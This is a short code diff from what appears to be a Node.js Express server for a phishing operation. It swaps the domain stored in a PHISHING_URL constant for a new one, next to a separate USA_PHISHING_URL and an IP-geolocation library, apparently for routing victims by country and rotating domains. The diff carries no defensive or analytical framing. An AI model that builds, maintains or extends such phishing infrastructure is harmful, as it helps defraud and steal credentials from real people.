@@ -8,7 +8,7 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "zavotly.site";
+const PHISHING_URL = "revoltsly.site";
 const USA_PHISHING_URL = "stirlaris.site";
 
 
